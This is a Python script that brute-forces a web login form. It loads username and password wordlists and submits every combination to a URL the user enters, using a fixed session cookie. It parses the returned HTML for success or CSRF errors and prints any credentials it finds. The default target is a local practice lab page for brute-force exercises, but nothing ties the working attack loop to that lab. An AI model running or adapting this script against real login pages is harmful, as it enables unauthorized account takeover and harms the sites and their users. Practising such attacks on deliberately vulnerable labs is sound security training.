import requests
import os
import sys
from bs4 import BeautifulSoup


# COOKIES = {"PHPSESSID": "1f2036c5bb525f5eaa4bf003aeb4d42c", "security": "low"}
COOKIES = {"id": "83mOjPvjoyEZGR2wW1Onwg"}
USERS_FILE = "logins+passwords/users.txt"
PASSWORDS_FILE = "logins+passwords/passwords.txt"


def load_file(file_name):
    if not os.path.exists(file_name):
        print(f"[!] Error: Cannot find file '{file_name}'")
        sys.exit(1)
    with open(file_name, "r", encoding="utf-8") as f:
        return [line.strip() for line in f.readlines()]


def check_login_success(html_content):
    soup = BeautifulSoup(html_content, "html.parser")

    success_div = soup.find("div", class_="message success")
    if success_div:
        return True

    error_div = soup.find("div", class_="message error")
    if error_div:
        if "CSRF" in error_div.get_text():
            return None
        return False

    if soup.find("img", src=True):
        return True

    text = soup.get_text()
    if "Welcome" in text:
        return True

    return False


def main():
    target_url = (
        input("Enter target url: ")
        or "http://localhost:4280/vulnerabilities/brute/"
    )

    users = load_file(USERS_FILE)
    passwords = load_file(PASSWORDS_FILE)

    print(f"[*] Users: {len(users)}, Passwords: {len(passwords)}")
    print(f"[*] Target: {target_url}\n")

    with requests.Session() as s:
        s.cookies.update(COOKIES)

        for user in users:
            print(f"--- Атака на пользователя: {user} ---")
            found_for_user = False

            for password in passwords:
                params = {
                    "username": user,
                    "password": password,
                    "Login": "Login",
                }

                try:
                    response = s.get(target_url, params=params)

                    if response.status_code != 200:
                        print(
                            f"[!] Error: Server returned status {response.status_code}"
                        )
                        return

                    result = check_login_success(response.text)

                    if result is True:
                        print(
                            f"\n[+] SUCCESS! Login: '{user}' | Password: '{password}'"
                        )
                        found_for_user = True
                        break

                    elif result is False:
                        print(f"[-] Incorrect: {password}")
                        pass

                    elif result is None:
                        print(
                            "[!] CRITICAL: CSRF Token mismatch or Session expired."
                        )
                        print("    Check your COOKIES in the script!")
                        return

                except requests.exceptions.RequestException as e:
                    print(f"[!] Connection error: {e}")
                    return

            if not found_for_user:
                print(f"[-] Password for '{user}' not found.")


if __name__ == "__main__":
    main()
